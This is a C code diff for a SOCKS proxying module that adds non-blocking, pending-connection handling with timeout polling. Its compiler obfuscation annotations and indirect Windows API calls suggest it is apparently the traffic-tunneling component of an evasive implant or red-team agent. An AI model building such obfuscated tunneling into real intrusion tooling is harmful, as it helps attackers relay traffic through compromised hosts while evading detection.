@@ -115,18 +115,27 @@ static BOOL socks_connect(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data, U
         goto exit;
     }
 
-    // Success response
+    // Check if connection is still pending (async)
+    PGLUON_SOCKS_CONN conn = socks_find_connection(ctx, server_id);
+    if (conn && conn->state == GS_CONN_PENDING) {
+        mcfree(ret);
+        *data_out     = NULL;
+        *data_out_len = 0;
+        return TRUE;
+    }
+
+    // Success response (immediate connect)
     API(RtlMoveMemory)(ret, "\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00", 10);
 
     exit:
     ;
 
     // exit
-    
+
     // Set output parameters
     *data_out     = ret;
     *data_out_len = 10;
-    
+
     return ret_val;
 }
 
@@ -182,6 +191,7 @@ static BOOL socks_open_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE data,
 
 __attribute__((annotate("fla,sub")))
 static BOOL socks_forward_data(PGLUON_SOCKS_CONN conn, PBYTE data, UINT32 data_len) {
+    if (conn->state != GS_CONN_CONNECTED) return TRUE;
     if (data_len > 0) {
             UINT32 total_sent = 0;
             while(total_sent < data_len) { // Keep sending until all data is sent
@@ -203,23 +213,19 @@ static BOOL socks_forward_data(PGLUON_SOCKS_CONN conn, PBYTE data, UINT32 data_l
     return TRUE;
 }
 
-// Create a new SOCKS connection
-// Target_ip cannot be null terminated since juste raw 4 byte copy is make
 __attribute__((annotate("bcf,sub")))
 BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip, UINT16 target_port) {
-#ifdef _WIN32 // Ensure Winsock is initialized
+#ifdef _WIN32
     if (!init_winsock()) {
         return FALSE;
     }
 
-    // Create socket
     SOCKET sock = API(WSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     if (sock == INVALID_SOCKET) {
         _err("Failed to create socket: %d", API(WSAGetLastError)());
         return FALSE;
     }
 
-    // Set non-blocking mode
     u_long mode = 1;
     if (API(ioctlsocket)(sock, FIONBIO, &mode) != 0) {
         _err("Failed to set non-blocking mode: %d", API(WSAGetLastError)());
@@ -228,18 +234,15 @@ BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip,
     }
 #endif
 
-    // Resolve target IP/domain
     struct sockaddr_in server_addr;
     API(RtlZeroMemory)(&server_addr, sizeof(server_addr));
-
     server_addr.sin_family = AF_INET;
     server_addr.sin_port   = target_port;
+    API(RtlMoveMemory)(&server_addr.sin_addr, target_ip, 4);
 
-    API(RtlMoveMemory)(&server_addr.sin_addr, target_ip, 4); // Copy resolved IP to sockaddr_in
+    BYTE initial_state = GS_CONN_CONNECTED;
 
-    // Connect (non-blocking)
     INT result = API(connect)(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
-    
     if (result == SOCKET_ERROR) {
         INT error = API(WSAGetLastError)();
         if (error != WSAEWOULDBLOCK) {
@@ -247,40 +250,9 @@ BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip,
             API(closesocket)(sock);
             return FALSE;
         }
-
-        // Wait for connection with timeout
-        fd_set write_fds;
-        FD_ZERO(&write_fds);
-        FD_SET(sock, &write_fds);
-
-        struct timeval timeout;
-        timeout.tv_sec = GS_SOCKS_CONNECT_TIMEOUT;
-        timeout.tv_usec = 0;
-
-        INT select_result = API(select)(0, NULL, &write_fds, NULL, &timeout);
-        if (select_result <= 0) {
-            _err("Connection timeout or select failed for %u.%u.%u.%u:%d", (UINT8)target_ip[0], (UINT8)target_ip[1], (UINT8)target_ip[2], (UINT8)target_ip[3], API(ntohs)(target_port));
-            API(closesocket)(sock);
-            return FALSE;
-        }
-
-        // Verify connection actually succeeded using SO_ERROR
-        INT sock_error = 0;
-        INT error_len = sizeof(sock_error);
-        if (API(getsockopt)(sock, SOL_SOCKET, SO_ERROR, (PCHAR)&sock_error, &error_len) != 0) {
-            _err("getsockopt failed: %d", API(WSAGetLastError)());
-            API(closesocket)(sock);
-            return FALSE;
-        }
-
-        if (sock_error != 0) {
-            _err("Connection failed for %u.%u.%u.%u:%d - error: %d", (UINT8)target_ip[0], (UINT8)target_ip[1], (UINT8)target_ip[2], (UINT8)target_ip[3], API(ntohs)(target_port), sock_error);
-            API(closesocket)(sock);
-            return FALSE;
-        }
+        initial_state = GS_CONN_PENDING;
     }
 
-    // Allocate new connection structure
     PGLUON_SOCKS_CONN conn = (PGLUON_SOCKS_CONN)mcalloc(sizeof(GLUON_SOCKS_CONN));
     if (conn == NULL) {
         _err("Failed to allocate SOCKS connection");
@@ -288,18 +260,26 @@ BOOL socks_create_conn(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PCHAR target_ip,
         return FALSE;
     }
 
-    conn->server_id  = server_id;
-    conn->socket     = sock;
-    conn->connected  = TRUE;
-    conn->next       = ctx->connections; // Insert at head
+    conn->server_id    = server_id;
+    conn->socket       = sock;
+    conn->state        = initial_state;
+    conn->connect_time = API(GetTickCount)();
+    conn->next         = ctx->connections;
 
-    // Update context
     ctx->connections = conn;
-    ctx->connection_count++; // Increment connection count
+    ctx->connection_count++;
 
-    _inf("Connected to %d.%d.%d.%d:%d with Server ID: %u",
-         (unsigned char)target_ip[0], (unsigned char)target_ip[1],
-         (unsigned char)target_ip[2], (unsigned char)target_ip[3], API(ntohs)(target_port), server_id);
+    if (initial_state == GS_CONN_CONNECTED) {
+        _inf("Connected to %d.%d.%d.%d:%d (instant) with Server ID: %u",
+             (unsigned char)target_ip[0], (unsigned char)target_ip[1],
+             (unsigned char)target_ip[2], (unsigned char)target_ip[3],
+             API(ntohs)(target_port), server_id);
+    } else {
+        _inf("Connecting to %d.%d.%d.%d:%d (pending) with Server ID: %u",
+             (unsigned char)target_ip[0], (unsigned char)target_ip[1],
+             (unsigned char)target_ip[2], (unsigned char)target_ip[3],
+             API(ntohs)(target_port), server_id);
+    }
 
     return TRUE;
 }
@@ -351,6 +331,56 @@ BOOL socks_remove(PGS_SOCKS_CONTEXT ctx, UINT32 server_id) {
         current = current->next;
     }
     return FALSE; // Not found
+}
+
+// Check pending connections for timeouts and completion
+__attribute__((annotate("fla,bcf")))
+VOID socks_check_pending(PGS_SOCKS_CONTEXT ctx, GS_CONN_CALLBACK callback) {
+    PGLUON_SOCKS_CONN current = ctx->connections;
+    UINT32 now = API(GetTickCount)();
+
+    while (current) {
+        PGLUON_SOCKS_CONN next = current->next;
+
+        if (current->state == GS_CONN_PENDING) {
+            UINT32 elapsed = now - current->connect_time;
+
+            if (elapsed > (GS_SOCKS_CONNECT_TIMEOUT * 1000)) {
+                _err("Connection timeout for Server ID: %u (%ums)", current->server_id, elapsed);
+                if (callback) callback(current->server_id, FALSE);
+                socks_remove(ctx, current->server_id);
+                current = next;
+                continue;
+            }
+
+            fd_set write_fds, error_fds;
+            FD_ZERO(&write_fds);
+            FD_ZERO(&error_fds);
+            FD_SET(current->socket, &write_fds);
+            FD_SET(current->socket, &error_fds);
+
+            struct timeval tv = {0, 0};
+            INT sel = API(select)(0, NULL, &write_fds, &error_fds, &tv);
+
+            if (sel > 0) {
+                INT sock_error = 0;
+                INT error_len  = sizeof(sock_error);
+                API(getsockopt)(current->socket, SOL_SOCKET, SO_ERROR, (PCHAR)&sock_error, &error_len);
+
+                if (sock_error == 0 && FD_ISSET(current->socket, &write_fds)) {
+                    current->state = GS_CONN_CONNECTED;
+                    _inf("Connection established for Server ID: %u", current->server_id);
+                    if (callback) callback(current->server_id, TRUE);
+                } else {
+                    _err("Connection failed for Server ID: %u (error: %d)", current->server_id, sock_error);
+                    if (callback) callback(current->server_id, FALSE);
+                    socks_remove(ctx, current->server_id);
+                }
+            }
+        }
+
+        current = next;
+    }
 }
 
 __attribute__((annotate("fla,bcf")))
@@ -407,6 +437,12 @@ BOOL socks_recv_data(PGS_SOCKS_CONTEXT ctx, UINT32 server_id, PBYTE *data_out, U
     if (conn == NULL) {
         _err("No connection found for Server ID: %u", server_id);
         return FALSE;
+    }
+
+    if (conn->state != GS_CONN_CONNECTED) {
+        *data_out     = NULL;
+        *data_out_len = 0;
+        return TRUE;
     }
 
     BOOL closed   = FALSE;
